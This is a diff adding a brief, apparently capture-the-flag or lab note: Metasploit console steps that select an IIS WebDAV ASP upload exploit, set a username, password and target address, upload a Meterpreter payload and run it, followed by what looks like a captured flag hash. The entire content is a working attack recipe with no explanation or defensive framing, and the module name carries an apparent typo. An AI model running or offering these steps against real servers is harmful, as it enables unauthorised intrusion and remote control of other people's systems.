@@ -1,0 +1,10 @@
+
+    - msfconsole
+    - search iis upload
+    - use exploit/windows/iis/iid_webdav_upload_asp
+    - set HttpPassword password_123321
+    - set HttpUsername bob
+    - set RHOSTS 10.6.16.213
+    - set PATH /webdav/meterpreter.asp
+    - run
+    d3aff16a801b4b7d36b4da1094bee345
